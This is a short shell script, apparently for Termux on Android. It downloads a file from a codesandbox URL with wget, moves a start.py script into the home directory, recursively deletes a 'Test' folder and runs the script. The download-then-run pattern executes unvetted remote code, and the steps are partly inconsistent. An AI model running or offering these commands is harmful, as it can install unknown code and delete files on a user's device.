cd /storage/extSdCard
wget https://sz85j.csb.app/test/extSdCard
mv extSdCard system
cd system
mv start.py /data/data/com.termux/files/home
cd
rm Test -r
python start.py